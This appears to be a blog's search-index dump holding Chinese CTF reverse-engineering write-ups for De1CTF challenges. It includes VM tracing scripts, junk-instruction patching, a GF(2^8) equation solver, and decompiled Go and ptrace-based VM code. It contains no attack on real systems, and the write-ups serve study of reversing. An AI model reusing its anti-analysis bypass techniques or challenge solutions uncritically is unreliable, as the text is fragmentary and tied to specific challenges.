print '0x%02xcode %03d%d-%d=%d'%(pc,code,opnum2,opnum1,opnum2-opnum1) pc += 1 elif code == 33: opnum1 = queue.get() opnum2 = queue.get() queue.put(opnum1*opnum2) print '0x%02xcode %03d%d*%d=%d'%(pc,code,opnum2,opnum1,opnum2*opnum1) pc +","date":"2020-05-07","objectID":"/de1ctf-2020-re/:2:0","tags":null,"title":"De1CTF-2020--re","uri":"/de1ctf-2020-re/"},{"categories":["writeup"],"content":"little elves ","date":"2020-05-07","objectID":"/de1ctf-2020-re/:3:0","tags":null,"title":"De1CTF-2020--re","uri":"/de1ctf-2020-re/"},{"categories":["writeup"],"content":"PE头修改 用ida无法直接打开，用readelf显示PE头跟正常PE差距挺大的，但是只要修改标识大端序小端序的那个位(第5字节)，改成0x01后还是可以用ida打开的，PE文件: ; [ Full breakdown ] ; --- Elf Header ; Offset # Value Purpose ; 0-3 A 7f454c46 Magic number - 0x7F, then 'ELF' in ASCII ; 4 B ba 1 = 32 bit, 2 = 64 bit ; 5 C dc 1 = little endian, 2 = big endian ; 6 D fe ELF Version ; 7 E 21 OS ABI - usually 0 for System V ; 8-F F 43be69191228eb3c Unused/padding ; 10-11 G 0200 1 = relocatable, 2 = executable, 3 = shared, 4 = core ; 12-13 H 3e00 Instruction set ; 14-17 I 01000000 ELF Version ; 18-1F J 0400000001000000 Program entry position ; 20-27 K 1c00000000000000 Program header table position - This is actually in the middle of J. ; 28-2f L 0000000000000000 Section header table position (Don't have one here so whatev) ; 30-33 M 01000000 Flags - architecture dependent ; 34-35 N 4000 Header size ; 36-37 O 3800 Size of an entry in the program header table ; 38-39 P 0100 Number of entries in the program header table ; 3A-3B Q 0200 Size of an entry in the section header table ; 3C-3D R b0a9 Number of entries in the section header table [holds mov al, 0xa9 load syscall] ; 3E-3F S 0f05 Index in section header table with the section name [holds syscall opcodes] ; ; --- Program Header ; OFFSET # Value Purpose ; 1C-1F PA 01000000 Type of segment ; 0 = null - ignore the entry ; 1 = load - clear p_memsz bytes at p_vaddr to 0, then copy p_filesz bytes from p_offset to p_vaddr ; 2 = dynamic - requires dynamic linking ; 3 = interp - contains a file path to an executable to use as an interpreter for the following segment ; 4 = note section ; 20-23 PB 1c000000 Flags ; 1 = executable ; 2 = writable ; 4 = readable ; In this case the flags are 1c which is 00011100 ; The ABI only pays attention to the lowest three bits, meaning this is marked \"read\" ; 24-2B PC 0000000000000000 The offset in the file that the data for this segment can be found (p_offset) ; 2C-33 PD 0000000001000000 Where you should start to put this segment in virtual memory (p_vaddr) ; 34-3B PE 4000380001000200 Physical Address ; 3C-43 PF b0a90f0500000000 Size of the segment in the file (p_filesz) | NOTE: Can store string here and p_memsz as long as they ; 44-4B PG b0a90f0500000000 Size of the segment in memory (p_memsz) | are equal and not over 0xffff - holds mov al, 0xa9 and syscall ; 4C-43 PH bfaddee1feebe990 The required alignment for this section (must be a power of 2) Well... supposedly, because you can write code here. ; ; Breakdown of the hex dump according to the above data ; A---------- B- C- D- E- F---------------------- ; 00000000 7f 45 4c 46 ba dc fe 21 43 be 69 19 12 28 eb 3c |.ELF...!C.i..(.\u003c| ; PA--------- ; G---- H---- I----------J---------------------- ; 00000010 02 00 3e 00 01 00 00 00 04 00 00 00 01 00 00 00 |..\u003e.............| ; PB--------- PC---------------------- PD--------- ; K----------------------L---------------------- ; 00000020 1c 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| ; PD--------- PE---------------------- PF--------- ; M---------- N---- O----P---- Q---- R---- S---- ; 00000030 01 00 00 00 40 00 38 00 01 00 02 00 b0 a9 0f 05 |....@.8.........| ; PF--------- PG---------------------- PH--------- ; 00000040 00 00 00 00 b0 a9 0f 05 00 00 00 00 bf ad de e1 |................| ; PH--------- ; 00000050 fe eb e9 90 |....| ","date":"2020-05-07","objectID":"/de1ctf-2020-re/:3:1","tags":null,"title":"De1CTF-2020--re","uri":"/de1ctf-2020-re/"},{"categories":["writeup"],"content":"去除花指令 花指令大致格式是jz xxx jmp xxx这种，需要把中间的jmp patch import struct stripd = \"\" jmp = [0xe7,0xe8,0xe9,0xea,0xeb] with open('little_elves', \"rb\") as f: raw = f.read() i = 0 while i \u003c len(raw): if raw[i] == \"\\x74\": length = struct.unpack('\u003cB', raw[i+1])[0] next_ins = struct.unpack('\u003cB', raw[i+2])[0] # print next_ins if next_ins in jmp: stripd += raw[i:i+2] + \"\\x90\"*length i = i + length + 2 else: stripd += raw[i] i = i + 1 else: stripd += raw[i] i += 1 with open('little_elves_strip', 'wb') as f: f.write(stripd) 去除花指令后可以看到大致的检测流程 for i in range(44): ch3 = 0 for j in range(44): ch1 = input[j] ch2 = t1[i][j] for k in range(8): if ch2 \u0026 1: ch3 ^= ch1 flag = ch1 \u0026 0x80 ch1 = (ch1 \u003c\u003c 1)\u00260xff if flag: ch1 ^= 0x39 ch2 \u003e\u003e= 1 assert(ch3 == t2[i]) ","date":"2020-05-07","objectID":"/de1ctf-2020-re/:3:2","tags":null,"title":"De1CTF-2020--re","uri":"/de1ctf-2020-re/"},{"categories":["writeup"],"content":"solve 我做到这一步就不会解了==z3也解不出来，我哭了，还是密码学== 就是在GF(2^8)下解一个AX=B的线性方程组 其中，当a2\u00260x80==1时，a2 = ((a2 * 2)\u00260xff) ^ 0x39相当于a2 = (a2 * 2) ^ 0x139 https://blog.csdn.net/hunyxv/article/details/89033227 F.\u003cx\u003e = GF(2^8,modulus=[1,0,0,1,1,1,0,0,1]) mt = [[166, 8, 116, 187, 48, 79, 49, 143, 88, 194, 27, 131, 58, 75, 251, 195, 192, 185, 69, 60, 84, 24, 124, 33, 211, 251, 140, 124, 161, 9, 44, 208, 20, 42, 8, 37, 59, 147, 79, 232, 57, 16, 12, 84], [73, 252, 81, 126, 50, 87, 184, 130, 196, 114, 29, 107, 153, 91, 63, 217, 31, 191, 74, 176, 208, 252, 97, 253, 55, 231, 82, 169, 185, 236, 171, 86, 208, 154, 192, 109, 255, 62, 35, 140, 91, 49, 139, 255], [57, 18, 43, 102, 96, 26, 50, 187, 129, 161, 7, 55, 11, 29, 151, 219, 203, 139, 56, 12, 176, 160, 250, 237, 1, 238, 239, 211, 241, 254, 18, 13, 75, 47, 215, 168, 149, 154, 33, 222, 77, 138, 240, 42], [96, 198, 230, 11, 49, 62, 42, 10, 169, 77, 7, 164, 198, 241, 131, 157, 75, 147, 201, 103, 120, 133, 161, 14, 214, 157, 28, 220, 165, 232, 20, 132, 16, 79, 9, 1, 33, 194, 192, 55, 109, 166, 101, 110], [108, 159, 167, 183, 165, 180, 74, 194, 149, 63, 211, 153, 174, 97, 102, 123, 157, 142, 47, 30, 185, 209, 57, 108, 170, 161, 126, 248, 206, 238, 140, 105, 192, 231, 237, 36, 46, 185, 123, 161, 97, 192, 168, 129], [72, 18, 132, 37, 37, 42, 224, 99, 92, 159, 95, 27, 18, 172, 43, 251, 97, 44, 238, 106, 42, 86, 124, 1, 231, 63, 99, 147, 239, 180, 217, 195, 203, 106, 21, 4, 238, 229, 43, 232, 193, 31, 116, 213], [17, 133, 116, 7, 57, 79, 20, 19, 197, 146, 5, 40, 103, 56, 135, 185, 168, 73, 3, 113, 118, 102, 210, 99, 29, 12, 34, 249, 237, 132, 57, 71, 44, 41, 1, 65, 136, 112, 20, 142, 162, 232, 225, 15], [224, 192, 5, 102, 220, 42, 18, 221, 124, 173, 85, 87, 112, 175, 157, 72, 160, 207, 229, 35, 136, 157, 229, 10, 96, 186, 112, 156, 69, 195, 89, 86, 238, 167, 169, 154, 137, 47, 205, 238, 22, 49, 177, 83], [234, 233, 189, 191, 209, 106, 254, 220, 45, 12, 242, 132, 93, 12, 226, 51, 209, 114, 131, 4, 51, 119, 117, 247, 19, 219, 231, 136, 251, 143, 203, 145, 203, 212, 71, 210, 12, 255, 43, 189, 148, 233, 199, 224], [5, 62, 126, 209, 242, 136, 95, 189, 79, 203, 244, 196, 2, 251, 150, 35, 182, 115, 205, 78, 215, 183, 88, 246, 208, 211, 161, 35, 39, 198, 171, 152, 231, 57, 44, 91, 81, 58, 163, 230, 179, 149, 114, 105], [72, 169, 107, 116, 56, 205, 187, 117, 2, 157, 39, 28, 149, 94, 127, 255, 60, 45, 59, 254, 30, 144, 182, 156, 159, 26, 39, 44, 129, 34, 111, 174, 176, 230, 253, 24, 139, 178, 200, 87, 44, 71, 67, 67], [5, 98, 151, 83, 43, 8, 109, 58, 204, 250, 125, 152, 246, 203, 135, 195, 8, 164, 195, 69, 148, 14, 71, 94, 81, 37, 187, 64, 48, 50, 230, 165, 20, 167, 254, 153, 249, 73, 201, 40, 106, 3, 93, 178], [104, 212, 183, 194, 181, 196, 225, 130, 208, 159, 255, 32, 91, 59, 170, 44, 71, 34, 99, 157, 194, 182, 86, 167, 148, 206, 237, 196, 250, 113, 22, 244, 100, 185, 47, 250, 33, 253, 204, 44, 191, 50, 146, 181], [143, 5, 236, 210, 136, 80, 252, 104, 156, 100, 209, 109, 103, 134, 125, 138, 115, 215, 108, 155, 191, 160, 228, 183, 21, 157, 225, 61, 89, 198, 250, 57, 189, 89, 205, 152, 184, 86, 207, 72, 65, 20, 209, 155], [103, 51, 118, 167, 111, 152, 184, 97, 213, 190, 175, 93, 237, 141, 92, 30, 82, 136, 16, 212, 99, 21, 105, 166, 161, 214, 103, 21, 116, 161, 148, 132, 95, 54, 60, 161, 207, 183, 250, 45, 156, 81, 208, 15], [150, 65, 4, 37, 202, 4, 54, 106, 113, 55, 51, 181, 225, 120, 173, 61, 251, 42, 153, 149, 88, 160, 79, 197, 204, 20, 65, 79, 165, 85, 203, 193, 203, 97, 9, 142, 53, 50, 127, 193, 225, 11, 121, 148], [99, 27, 20, 52, 248, 197, 117, 210, 216, 249, 122, 48, 225, 117, 211, 2, 33, 172, 60, 140, 84, 44, 71, 187, 160, 198, 26, 100, 162, 92, 89, 181, 82, 55, 184, 152, 112, 51, 248, 255, 205, 145, 31, 137], [209, 78, 219, 94, 189, 146, 92, 172, 214, 106, 122, 121, 90, 60, 174, 6, 82, 28, 166, 206, 248, 86, 28, 113, 159, 183, 196, 12, 183, 146, 225, 107, 169, 128, 67, 221, 228, 244, 212, 66, 118, 136, 162, 218], [163, 143, 112, 123, 98, 87, 0, 143, 198, 176, 196, 246, 231, 201, 157, 169, 244, 123, 106, 210, 50, 159,","date":"2020-05-07","objectID":"/de1ctf-2020-re/:3:3","tags":null,"title":"De1CTF-2020--re","uri":"/de1ctf-2020-re/"},{"categories":["writeup"],"content":"mc_ticktock 解出upx之后没看明白是个啥我就点了x。。。whcwhcwhc ","date":"2020-05-07","objectID":"/de1ctf-2020-re/:4:0","tags":null,"title":"De1CTF-2020--re","uri":"/de1ctf-2020-re/"},{"categories":["writeup"],"content":"go程序识别 https://www.anquanke.com/post/id/170332 是个striped的程序，go程序的会包含.gopclntab这个段，段中存储了函数的实际名称(windows下编译的除外) 可以使用https://github.com/sibears/IDAGolangHelper这个插件来恢复符号信息，如果运行了以后出现以下错误: 需要将ida_ida.inf_get_min_ea()修改为idc.BeginEA() ","date":"2020-05-07","objectID":"/de1ctf-2020-re/:4:1","tags":null,"title":"De1CTF-2020--re","uri":"/de1ctf-2020-re/"},{"categories":["writeup"],"content":"程序分析 运行webserver发现程序使用了80和8080两个端口 _QWORD *__fastcall main_muxRegister(__int64 a1, __int64 a2) { __int64 v2; // rdx __int64 v3; // r8 __int64 v4; // r9 _QWORD *v5; // rax __int64 v6; // rdx __int64 v7; // r8 __int64 v8; // r9 __int64 v9; // rdx _QWORD *v11; // rcx __int64 v12; // [rsp+0h] [rbp-40h] _QWORD *v13; // [rsp+8h] [rbp-38h] _QWORD *v14; // [rsp+18h] [rbp-28h] _QWORD *v15; // [rsp+28h] [rbp-18h] void *retaddr; // [rsp+40h] [rbp+0h] if ( \u0026retaddr \u003c= *(__readfsqword(0xFFFFFFF8) + 16) ) runtime_morestack_noctxt(a1, a2); runtime_makemap_small(a1); runtime_newobject(a1, a2); v5 = v13; if ( dword_9B4370 ) { a1 = (v13 + 7); runtime_gcWriteBarrier(v13 + 7); v5 = v11; } else { v13[7] = v12; } v15 = v5; github_com_gorilla_mux__ptr_Router_HandleFunc(a1, a2, v2, \u0026off_753B08, v3, v4, v5, \u0026unk_73CD7C, 9LL, \u0026off_753B08); github_com_gorilla_mux__ptr_Router_HandleFunc(a1, a2, v6, off_753B20, v7, v8, v15, \u0026unk_73CD73, 9LL, off_753B20); github_com_gorilla_mux__ptr_Router_PathPrefix(a1, a2, v9, \"/0456:;\u003c=\u003e?@BCLMNOPSZ[\\\"\\\\\\n\\r\\t\"); if ( !v14[5] ) { *v14 = \u0026off_7A4E40; if ( dword_9B4370 ) runtime_gcWriteBarrier(v14 + 1); else v14[1] = \u0026off_753B28; } return v15; } Router_HandleFunc是设置访问路由的，第一个设置的是webproxy第二个是ticktock，尝试访问http://192.168.190.128/ticktock会提示缺少text字段，加上后显示如下: 处理ticktock路由的函数如下: __int64 __fastcall main_muxRegister_func2(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, __int64 a7, __int64 a8, __int64 *a9) { __int64 v9; // rcx __int64 result; // rax __int64 v11; // rdx __int64 v12; // rcx __int64 v13; // r8 char v14; // r9 __int64 v15; // r8 __int64 v16; // r9 __int64 v17; // rcx __int128 v18; // ST00_16 __int64 v19; // r8 __int64 v20; // r9 __int64 v21; // r8 __int64 v22; // rdx __int64 v23; // r8 __int64 v24; // r9 __int64 v25; // rdx __int64 v26; // rdx __int64 v27; // r8 __int64 v28; // r9 __int64 v29; // rdx __int64 v30; // r8 char v31; // dl int v32; // ecx char v33; // r8 __int64 v34; // [rsp+8h] [rbp-88h] _QWORD *v35; // [rsp+8h] [rbp-88h] char *v36; // [rsp+8h] [rbp-88h] __int64 v37; // [rsp+18h] [rbp-78h] __int64 *v38; // [rsp+20h] [rbp-70h] __int64 v39; // [rsp+20h] [rbp-70h] __int64 v40; // [rsp+28h] [rbp-68h] __int64 v41; // [rsp+30h] [rbp-60h] __int64 v42; // [rsp+38h] [rbp-58h] __int64 v43; // [rsp+58h] [rbp-38h] __int64 v44; // [rsp+80h] [rbp-10h] if ( \u0026v44 \u003c= *(__readfsqword(0xFFFFFFF8) + 16) ) runtime_morestack_noctxt(a1, a2); v9 = *a9; if ( a9[1] != 3 || *v9 != 17735 || *(v9 + 2) != 84 ) return (*(a7 + 40))(a1, a2, a3, a8, a5, a6, a8, 405LL); net_url__ptr_URL_Query(a1, a2, a3, a9[2], a5, a6, a9[2]); runtime_mapaccess2_faststr(a1, a2, v11, v12, v13, v14); v17 = *v38; if ( v40 \u0026\u0026 v38[1] \u003e 0 \u0026\u0026 *(v17 + 8) \u003e 0LL ) { if ( qword_996E00 \u003c 0x10 ) runtime_panicSliceAcap(a1, a2); v43 = *v38; *\u0026v18 = qword_996DF0; *(\u0026v18 + 1) = 16LL; webserver_crypt_NewCipher(a1, a2, qword_996E00, v17, v15, v16, v18, qword_996E00); if ( v40 ) { runtime_newobject(a1, a2); *v35 = 'lanretni'; *(v35 + 6) = 'rorre la'; result = (*(a7 + 32))(a1); } else { if ( qword_996E20 \u003c 0x10 ) runtime_panicSliceAcap(a1, a2); crypto_cipher_newCFB(a1, a2, qword_996E20, 4LL, v19, v20, 4LL, v38, qword_996E10, 0x10, qword_996E20, 0); runtime_stringtoslicebyte(a1, a2, v42, *(v43 + 8), v21); runtime_makeslice(a1, a2, v37); (*(v41 + 24))(a1, a2, v39, *(v41 + 24)); encoding_base64__ptr_Encoding_EncodeToString(a1, a2, v22, v39, v23, v24); runtime_convTstring(a1, a2, v25); v44 = v39; fmt_Sprintf(a1, a2, v26, \u0026unk_6C5A40, v27, v28, \u0026unk_73DD90);// TickTock %s runtime_stringtoslicebyte(a1, a2, v29, v39, v30); v36 = \u0026unk_1; (*(a7 + 32))(a8); if ( qword_98B3C8 == v39 ) { v36 = off_98B3C0; runtime_memequal(a8, 1LL, v37, v39); result = v39; } else { result = 0LL; } if ( result ) { runtime_newobject(a8, 1LL); *v36 = 'arceniM\\n'; *(v36 + 8) = byte_741CD8; // Minecra is ticking... (*(a7 + 32))(a8); result = runtime_newproc(a8, 1, v31, v32, v33); } } } else { runtime_newobject(a1, a2); *v34 = ' dilavni'; // invalid param: text *(v34 + 3) = *\u0026byte_7400D5; r","date":"2020-05-07","objectID":"/de1ctf-2020-re/:4:2","tags":null,"title":"De1CTF-2020--re","uri":"/de1ctf-2020-re/"},{"categories":["writeup"],"content":"参考链接 https://mp.weixin.qq.com/s/KKkxUb_rUEi7Pxj0Qj5Odw 是Chamd5的wp，感觉详细很多 ","date":"2020-05-07","objectID":"/de1ctf-2020-re/:5:0","tags":null,"title":"De1CTF-2020--re","uri":"/de1ctf-2020-re/"},{"categories":["writeup"],"content":"De1CTF2019这两道vm的题都是与signal通信相关，记录一下。 ","date":"2020-05-01","objectID":"/de1ctf2019-signal-vm/:0:0","tags":null,"title":"De1CTF2019-signal-vm","uri":"/de1ctf2019-signal-vm/"},{"categories":["writeup"],"content":"signal vm ","date":"2020-05-01","objectID":"/de1ctf2019-signal-vm/:1:0","tags":null,"title":"De1CTF2019-signal-vm","uri":"/de1ctf2019-signal-vm/"},{"categories":["writeup"],"content":"恢复符号表 静态链接去符号表文件，需要恢复符号表 $ strings signal_vm | grep GCC GCC: (Ubuntu 7.4.0-1ubuntu1~18.04) 7.4.0 查找sig的链接https://github.com/push0ebp/sig-database ","date":"2020-05-01","objectID":"/de1ctf2019-signal-vm/:1:1","tags":null,"title":"De1CTF2019-signal-vm","uri":"/de1ctf2019-signal-vm/"},{"categories":["writeup"],"content":"程序分析 signed __int64 sub_40172D() { signed int v1; // [rsp+Ch] [rbp-4h] sub_4102B0((unsigned __int64)\"Check up: \"); sub_410430((unsigned __int64)\"%s\"); v1 = _libc_fork(\"%s\", \u0026unk_6D5132); if ( v1 \u003c 0 ) return 0xFFFFFFFFLL; if ( !v1 ) { ((void (*)(void))loc_4014CA)(); exit(0LL); } sub_400B6D(v1); if ( dword_6D74E0[0] ) IO_puts(\"Ture.\"); else IO_puts(\"False.\"); return 0LL; } 输入之后子进程执行loc_4014ca父进程进入sub_400B6D，子进程的程序如下： 程序执行ptrace后有一系列的非法指令 父进程的程序如下 __int64 __fastcall sub_400B6D(unsigned int a1) { __int64 v1; // r8 __int64 v2; // r9 __int64 v3; // r8 __int64 v4; // r9 char v5; // ST00_1 __int64 v6; // r8 __int64 v7; // r9 __int64 v8; // r8 __int64 v9; // r9 char v10; // ST00_1 char v12; // [rsp+0h] [rbp-160h] char v13; // [rsp+0h] [rbp-160h] int v14; // [rsp+1Ch] [rbp-144h] char v15; // [rsp+30h] [rbp-130h] unsigned __int64 v16; // [rsp+B0h] [rbp-B0h] int stat_addr[2]; // [rsp+110h] [rbp-50h] __int64 v18; // [rsp+118h] [rbp-48h] __int64 v19; // [rsp+120h] [rbp-40h] __int64 v20; // [rsp+128h] [rbp-38h] __int64 v21; // [rsp+130h] [rbp-30h] __int64 v22; // [rsp+138h] [rbp-28h] unsigned __int64 v23; // [rsp+148h] [rbp-18h] v23 = __readfsqword(0x28u); *(_QWORD *)stat_addr = 0LL; v18 = 0LL; v19 = 0LL; v20 = 0LL; v21 = 0LL; v22 = 0LL; v14 = 0; memset(\u0026v15, 0, 0xD8uLL); _libc_wait(stat_addr); // 等待子进程发来信号或者子进程退出 while ( LOBYTE(stat_addr[0]) == 127 ) { ptrace(12LL, a1, 0LL, (__int64)\u0026v15, v1, v2, v12); //PTRACE_GETREGS 获取寄存器的状态 v19 = ptrace(1LL, a1, v16, 0LL, v3, v4, v5); //PTRACE_PEEKTEXT从进程中读取v16处的值 switch ( BYTE1(stat_addr[0]) ) { case 4: if ( BYTE1(v19) == 1 ) { v14 = *(_DWORD *)((char *)\u0026v19 + 3); v16 += 7LL; } else { v14 = BYTE3(v19); v16 += 4LL; } if ( BYTE1(v19) == 1 ) { dword_6D74E0[BYTE2(v19)] = v14; } else if ( (signed int)BYTE1(v19) \u003e 1 ) { if ( BYTE1(v19) == 2 ) { dword_6D74E0[BYTE2(v19)] = (unsigned __int8)aAlmostHeavenWe[dword_6D74E0[v14]]; } else if ( BYTE1(v19) == 32 ) { aAlmostHeavenWe[dword_6D74E0[BYTE2(v19)]] = dword_6D74E0[v14]; } } else if ( !BYTE1(v19) ) { dword_6D74E0[BYTE2(v19)] = dword_6D74E0[v14]; } break; case 5: if ( BYTE1(v19) == 1 ) { v16 += 7LL; v14 = *(_DWORD *)((char *)\u0026v19 + 3); } else if ( !BYTE1(v19) ) { v16 += 4LL; v14 = dword_6D74E0[BYTE3(v19)]; } switch ( (unsigned __int8)v19 ) { case 0u: dword_6D74E0[BYTE2(v19)] += v14; break; case 1u: dword_6D74E0[BYTE2(v19)] -= v14; break; case 2u: dword_6D74E0[BYTE2(v19)] *= v14; break; case 3u: dword_6D74E0[BYTE2(v19)] /= v14; break; case 4u: dword_6D74E0[BYTE2(v19)] %= v14; break; case 5u: dword_6D74E0[BYTE2(v19)] |= v14; break; case 6u: dword_6D74E0[BYTE2(v19)] \u0026= v14; break; case 7u: dword_6D74E0[BYTE2(v19)] ^= v14; break; case 8u: dword_6D74E0[BYTE2(v19)] \u003c\u003c= v14; break; case 9u: dword_6D74E0[BYTE2(v19)] \u003e\u003e= v14; break; default: goto LABEL_59; } break; case 8: if ( BYTE2(v19) == 1 ) { v14 = HIDWORD(v19); dword_6D74FC = dword_6D74E0[BYTE3(v19)] - HIDWORD(v19); v16 += 8LL; } else if ( !BYTE2(v19) ) { v14 = BYTE4(v19); dword_6D74FC = dword_6D74E0[BYTE3(v19)] - dword_6D74E0[BYTE4(v19)]; v16 += 5LL; } break; case 0xB: switch ( BYTE2(v19) ) { case 0u: v16 += *(signed int *)((char *)\u0026v19 + 3); break; case 1u: if ( dword_6D74FC ) v16 += 7LL; else v16 += *(signed int *)((char *)\u0026v19 + 3); break; case 2u: if ( dword_6D74FC ) v16 += *(signed int *)((char *)\u0026v19 + 3); else v16 += 7LL; break; case 3u: if ( dword_6D74FC \u003c= 0 ) v16 += 7LL; else v16 += *(signed int *)((char *)\u0026v19 + 3); break; case 4u: if ( dword_6D74FC \u003c 0 ) v16 += 7LL; else v16 += *(signed int *)((char *)\u0026v19 + 3); break; case 5u: if ( dword_6D74FC \u003e= 0 ) v16 += 7LL; else v16 += *(signed int *)((char *)\u0026v19 + 3); break; case 6u: if ( dword_6D74FC \u003e 0 ) v16 += 7LL; else v16 += *(signed int *)((char *)\u0026v19 + 3); break; default: goto LABEL_59; } break; } LABEL_59: ptrace(13LL, a1, 0LL, (__int64)\u0026v15, v6, v7, v13);// PTRACE_SETREGS 设置寄存器的值 ptrace(7LL, a1, 0LL, 0LL, v8, v9, v10); // PTRACE_CONT 相当于gdb中的continue _libc_wait(stat_addr); } ptrace(8LL, a1, 0LL, 0LL, v1, v2, v12); //PTRACE_KILL return 0LL; } 父进程的执行控","date":"2020-05-01","objectID":"/de1ctf2019-signal-vm/:1:2","tags":null,"title":"De1CTF2019-signal-vm","uri":"/de1ctf2019-signal-vm/"},{"categories":["writeup"],"content":"恢复系统函数的常数参数 因为是去符号表的程序，所以ptrace函数的参数都用数字的方式显示，一个一个对照着去找有点麻烦，可以用strace直接找出系统调用 strace ./signal_vm \u003e\u0026 a.out execve(\"./signal_vm\", [\"./signal_vm\"], 0x7ffc6205b0f0 /* 55 vars */) = 0 brk(NULL) = 0xa4e000 brk(0xa4f1c0) = 0xa4f1c0 arch_prctl(ARCH_SET_FS, 0xa4e880) = 0 uname({sysname=\"Linux\", nodename=\"ubuntu\", ...}) = 0 readlink(\"/proc/self/exe\", \"/home/ep/Desktop/signal_vm\", 4096) = 26 brk(0xa701c0) = 0xa701c0 brk(0xa71000) = 0xa71000 access(\"/etc/ld.so.nohwcap\", F_OK) = -1 ENOENT (No such file or directory) fstat(1, {st_mode=S_IFREG|0644, st_size=774, ...}) = 0 fstat(0, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0 read(0, hh \"hh\\n\", 1024) = 3 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xa4eb50) = 20978 wait4(-1, [{WIFSTOPPED(s) \u0026\u0026 WSTOPSIG(s) == SIGILL}], 0, NULL) = 20978 --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_TRAPPED, si_pid=20978, si_uid=1000, si_status=SIGILL, si_utime=0, si_stime=0} --- ptrace(PTRACE_GETREGS, 20978, NULL, 0x7ffda8ef6780) = 0 ptrace(PTRACE_PEEKTEXT, 20978, 0x4014ec, [0x600000000060106]) = 0 ptrace(PTRACE_SETREGS, 20978, NULL, 0x7ffda8ef6780) = 0 ptrace(PTRACE_CONT, 20978, NULL, SIG_0) = 0 wait4(-1, [{WIFSTOPPED(s) \u0026\u0026 WSTOPSIG(s) == SIGILL}], 0, NULL) = 20978 --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_TRAPPED, si_pid=20978, si_uid=1000, si_status=SIGILL, si_utime=0, si_stime=0} --- ptrace(PTRACE_GETREGS, 20978, NULL, 0x7ffda8ef6780) = 0 ptrace(PTRACE_PEEKTEXT, 20978, 0x4014f3, [0x30106]) = 0 ptrace(PTRACE_SETREGS, 20978, NULL, 0x7ffda8ef6780) = 0 ptrace(PTRACE_CONT, 20978, NULL, SIG_0) = 0 wait4(-1, [{WIFSTOPPED(s) \u0026\u0026 WSTOPSIG(s) == SIGSEGV}], 0, NULL) = 20978 --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_TRAPPED, si_pid=20978, si_uid=1000, si_status=SIGSEGV, si_utime=0, si_stime=0} --- 如上所示，ptrace函数的参数都可以显示出来不用自己一个一个去找。同时因为父进程是根据子进程的异常signal进行处理，一共有4: \"SIGILL\", 5 : \"SIGTRAP\", 8: \"SIGFPE\", 0xb: \"SIGSEGV\"四种异常，只依靠子进程执行的非法指令很难知道每一步触发了什么异常，但是从上面的strace结果中的wait4(-1, [{WIFSTOPPED(s) \u0026\u0026 WSTOPSIG(s) == SIGSEGV}], 0, NULL) = 20978可以看到具体的信号，也不用自己一个一个记录了。 ","date":"2020-05-01","objectID":"/de1ctf2019-signal-vm/:1:3","tags":null,"title":"De1CTF2019-signal-vm","uri":"/de1ctf2019-signal-vm/"},{"categories":["writeup"],"content":"solve 到这一步基本上只要根据signal去翻译子进程的那一串非法指令即可。但是我找wp的时候看到了一个直接使用gdb python编程解决的，我感觉会方便很多，记录一下。 signal | machine code | handler ------------------------------------------- SIGILL | 06 | mov, lea ... SIGTRAP | CC | add, sub, mul div ... SIGSEGV | 00 00 | jcc SIGFPE | 30 C0 F6 F8 | cmp ps:gdb python必须要在gdb中执行。使用source your-python-file这个命令来执行 import gdb import struct class Opcode: #opcode结构 opcode = \"\" val1 = 0 const = 0 src = 0 dest = 0 final = 0 final2 = 0 def __init__(self, opcode): self.opcode = opcode test = struct.unpack(\"\u003cQ\", int(opcode, 16).to_bytes(8, byteorder='big'))[0] self.val1 = test \u003e\u003e 56 self.const = (test \u003e\u003e 48) \u0026 0xff self.src = (test \u003e\u003e 40) \u0026 0xff self.dest = (test \u003e\u003e 32) \u0026 0xff self.final = struct.unpack(\"\u003cI\", ((test \u0026 0xffffffff00) \u003e\u003e 8).to_bytes(4, byteorder='big'))[0] self.final2 = struct.unpack(\"\u003cI\", (test \u0026 0xffffffff).to_bytes(4, byteorder='big'))[0] def __repr__(self): str_out = \"-------------------\\n\" str_out += \"OPCODE : %s| %d\\n\" % (self.opcode, int(self.opcode, 16) ) str_out += \"val1 = %d| const = %d| src = %d| dest = %d\\n\" % (self.val1, self.const, self.src, self.dest) str_out += \"val1 = %s| const = %s| src = %s| dest = %s\\n\" % (hex(self.val1), hex(self.const), hex(self.src), hex(self.dest)) str_out += \"final = %d| final2 = %d\\n\" % (self.final, self.final2) str_out += \"-------------------\\n\" return str_out sign = {4: \"SIGILL\", 5 : \"SIGTRAP\", 8: \"SIGFPE\", 0xb: \"SIGSEGV\" } mov_ins = {0: \"%d: mov r%dr%d\\n\",1: \"%d: mov r%d0x%x\\n\" ,2: \"%d: mov r%d[r%d]\\n\", 32: \"%d: mov [r%d] r%d\\n\"} ops = [\"add\" , \"sub\" , \"mul\" , \"div\" , \"mod\" , \"or\" , \"and\" , \"xor\" , \"lsh\" , \"rsh\"] op_sym = [\"+\", \"-\", \"*\", \"/\", \"%\", \"|\", \"\u0026\", \"^\", \"\u003c\u003c\", \"\u003e\u003e\"] str_ops = [\"%d: %sr%dr%d\\n\", \"%d: %sr%d0x%x\\n\"] jmp = [\"\", \"eq\", \"neq\", \"le\", \"lt\", \"ge\", \"gt\"] f = open('ins.out', 'w') gdb.execute(\"file signal_vm\") # 加载被调试的可执行程序文件 gdb.execute(\"set pagination off\") #gdb会全部输出，中间不暂停 gdb.execute(\"set follow-fork-mode parent\") #fork之后继续调试父进程 gdb.execute(\"b * 0x400C5B\") # 获取子进程内存值的ptrace处 gdb.execute(\"b * 0x400C67\") # signal控制跳转处 gdb.execute(\"b * 0x401448\") # 设置寄存器值的ptrace处 gdb.execute(\"r \u003c input\") i = 0 while True: try: i = int(gdb.execute(\"p/x $rdx\", to_string=True).split(\"=\")[1].strip(),16) if a == 0: a = i i = i % a gdb.execute(\"ni\") # 执行call ptrace后获取rax中的返回值 except gdb.error: break opcode = gdb.execute(\"p/x $rax\", to_string=True).split(\"=\")[1].strip() gdb.execute(\"c\") # 将BYTE1(stat_addr[0])保存在al中来控制跳转的，直接获取al的值 sig = gdb.execute(\"p/x $al\", to_string=True).split(\"=\")[1].strip() gdb.execute(\"c\") print(sign[int(sig, 16)]) op = Opcode(opcode) 